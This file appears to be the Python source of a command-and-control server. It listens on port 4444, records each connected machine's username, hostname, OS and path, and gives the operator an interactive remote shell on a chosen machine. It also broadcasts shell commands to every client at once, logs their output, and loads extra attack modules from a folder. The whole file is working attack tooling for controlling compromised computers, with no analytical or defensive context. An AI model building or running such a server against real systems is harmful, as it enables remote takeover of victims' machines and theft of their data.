import socket
import threading
import importlib
import os
import sys

DELIMITER = b"<END_OF_MESSAGE>"
BUFFER_SIZE = 4096

class ClientSession:
    def __init__(self, conn, addr, index):
        self.conn = conn
        self.addr = addr
        self.index = index
        self.info = None
        self.username = None
        self.hostname = None
        self.os = None
        self.current_path = None
        self.connected = True
        self.log = []

    def send(self, data):
        try:
            self.conn.sendall(data.encode("utf-8", errors="replace") + DELIMITER)
        except Exception as e:
            print(f"[!] Error sending to {self.addr}: {e}")
            self.connected = False

    def receive(self):
        try:
            data = b""
            while True:
                chunk = self.conn.recv(BUFFER_SIZE)
                if not chunk:
                    self.connected = False
                    return None
                data += chunk
                if DELIMITER in data:
                    msg, _ = data.split(DELIMITER, 1)
                    return msg.decode("utf-8", errors="replace")
        except Exception as e:
            print(f"[!] Error receiving from {self.addr}: {e}")
            self.connected = False
            return None

    def close(self):
        self.connected = False
        try:
            self.conn.close()
        except:
            pass

    def parse_info(self, info_text):
        self.info = info_text.strip()
        for line in self.info.splitlines():
            if line.lower().startswith("username:"):
                self.username = line.split(":",1)[1].strip()
            if line.lower().startswith("hostname:"):
                self.hostname = line.split(":",1)[1].strip()
            if line.lower().startswith("os:"):
                self.os = line.split(":",1)[1].strip()
            if line.lower().startswith("current path:"):
                self.current_path = line.split(":",1)[1].strip()

    def summary(self):
        return f"[{self.index}] {self.addr[0]}:{self.addr[1]} | {self.username or '?'}@{self.hostname or '?'} | {self.os or '?'} | {self.current_path or '?'} | {'online' if self.connected else 'offline'}"

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.sessions = []
        self.sessions_lock = threading.Lock()
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.running = True
        self.commands = {}

    def register_command(self, name, func, description=""):
        self.commands[name] = (func, description)

    def load_extensions(self, extensions):
        for ext in extensions:
            try:
                mod = importlib.import_module(ext)
                if hasattr(mod, 'register'):
                    mod.register(self)
                    print(f"[+] Loaded module: {ext}")
                else:
                    print(f"[!] Module {ext} has no register(server) function.")
            except Exception as e:
                print(f"[!] Failed to load {ext}: {e}")

    def start(self):
        self.server_sock.bind((self.host, self.port))
        self.server_sock.listen(50)
        print(f"[+] Server listening on {self.host}:{self.port}")
        threading.Thread(target=self.accept_clients, daemon=True).start()
        self.interactive_menu()

    def accept_clients(self):
        idx = 0
        while self.running:
            try:
                conn, addr = self.server_sock.accept()
                session = ClientSession(conn, addr, idx)
                with self.sessions_lock:
                    self.sessions.append(session)
                threading.Thread(target=self.handle_client, args=(session,), daemon=True).start()
                idx += 1
            except Exception as e:
                print(f"[!] Accept error: {e}")

    def handle_client(self, session):
        info = session.receive()
        if info:
            session.parse_info(info)
            print(f"\n[+] New client: {session.summary()}")
        else:
            print(f"[!] Failed to get info from {session.addr}")
            session.close()

    def list_clients(self):
        with self.sessions_lock:
            print("\n--- Connected Clients ---")
            for s in self.sessions:
                print(s.summary())
            print("------------------------")

    def select_client(self):
        self.list_clients()
        idx = input("Select client index: ").strip()
        if not idx.isdigit():
            print("Invalid input.")
            return None
        idx = int(idx)
        with self.sessions_lock:
            for s in self.sessions:
                if s.index == idx and s.connected:
                    return s
        print("Client not found or not online.")
        return None

    def broadcast_command(self, cmd):
        with self.sessions_lock:
            targets = [s for s in self.sessions if s.connected]
        print(f"Broadcasting to {len(targets)} clients...")
        for s in targets:
            s.send(cmd)
        for s in targets:
            output = s.receive()
            if output is not None:
                s.log.append((cmd, output))
                print(f"\n--- Output from {s.username or s.addr[0]} ---\n{output}\n-------------------------")
            else:
                print(f"[!] No response from {s.addr}")

    def disconnect_client(self, idx):
        with self.sessions_lock:
            for s in self.sessions:
                if s.index == idx:
                    s.close()
                    print(f"Disconnected client {idx}")
                    return
        print("Client not found.")

    def rename_client(self, idx, newname):
        with self.sessions_lock:
            for s in self.sessions:
                if s.index == idx:
                    s.username = newname
                    print(f"Renamed client {idx} to {newname}")
                    return
        print("Client not found.")

    def show_logs(self, idx):
        with self.sessions_lock:
            for s in self.sessions:
                if s.index == idx:
                    print(f"\n--- Log for client {idx} ---")
                    for cmd, output in s.log:
                        print(f"> {cmd}\n{output}\n")
                    print("---------------------------")
                    return
        print("Client not found.")

    def interactive_menu(self):
        menu = [
            "list                  - List all clients",
            "select                - Interact with a client shell",
            "broadcast <cmd>       - Send command to all clients",
            "disconnect <idx>      - Disconnect a client",
            "rename <idx> <name>   - Rename client's username",
            "logs <idx>            - Show command/output log for a client",
            "help                  - Show this menu",
            "exit                  - Exit server"
        ]
        print("\nCommands:")
        for line in menu:
            print("  " + line)
        if self.commands:
            print("\nModule commands:")
            for name, (func, desc) in self.commands.items():
                print(f"  {name:<20} {desc}")
        print()
        while True:
            try:
                cmd = input("C2> ").strip()
                if cmd == "list":
                    self.list_clients()
                elif cmd == "select":
                    session = self.select_client()
                    if session:
                        print(f"[*] Interactive shell with {session.summary()}")
                        while session.connected:
                            scmd = input(f"{session.username or session.addr[0]}$ ").strip()
                            if scmd in {"exit", "quit", "back"}:
                                break
                            if not scmd:
                                continue
                            session.send(scmd)
                            output = session.receive()
                            if output is None:
                                print("[!] Client disconnected.")
                                break
                            print(output)
                            session.log.append((scmd, output))
                elif cmd.startswith("broadcast "):
                    _, bcmd = cmd.split(" ", 1)
                    self.broadcast_command(bcmd)
                elif cmd.startswith("disconnect "):
                    _, idx = cmd.split(" ", 1)
                    if idx.isdigit():
                        self.disconnect_client(int(idx))
                    else:
                        print("Usage: disconnect <idx>")
                elif cmd.startswith("rename "):
                    parts = cmd.split(" ")
                    if len(parts) >= 3 and parts[1].isdigit():
                        idx = int(parts[1])
                        newname = " ".join(parts[2:])
                        self.rename_client(idx, newname)
                    else:
                        print("Usage: rename <idx> <name>")
                elif cmd.startswith("logs "):
                    _, idx = cmd.split(" ", 1)
                    if idx.isdigit():
                        self.show_logs(int(idx))
                    else:
                        print("Usage: logs <idx>")
                elif cmd == "help":
                    self.interactive_menu()
                elif cmd == "exit":
                    print("Exiting server and disconnecting all clients...")
                    self.running = False
                    with self.sessions_lock:
                        for s in self.sessions:
                            s.close()
                    self.server_sock.close()
                    break
                else:
                    parts = cmd.split()
                    if parts and parts[0] in self.commands:
                        try:
                            handler, _ = self.commands[parts[0]]
                            handler(parts[1:], self)
                        except Exception as e:
                            print(f"[!] Error in command '{parts[0]}': {e}")
                    else:
                        print("Unknown command. Type 'help' for menu or check custom modules.")
            except KeyboardInterrupt:
                print("\n[!] Ctrl-C detected, shutting down.")
                self.running = False
                with self.sessions_lock:
                    for s in self.sessions:
                        s.close()
                self.server_sock.close()
                break
            except Exception as e:
                print(f"[!] Error: {e}")

def discover_extensions(directory="modules"):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    modules_dir = os.path.join(script_dir, directory)
    exts = []
    if not os.path.exists(modules_dir):
        print(f"Directory '{modules_dir}' does not exist.")
        return exts
    for fname in os.listdir(modules_dir):
        if fname.endswith(".py") and fname != "__init__.py":
            modname = f"{directory}.{fname[:-3]}"
            exts.append(modname)
    return exts

if __name__ == "__main__":
    extensions = discover_extensions("modules")
    server = C2Server()
    server.load_extensions(extensions)
    server.start()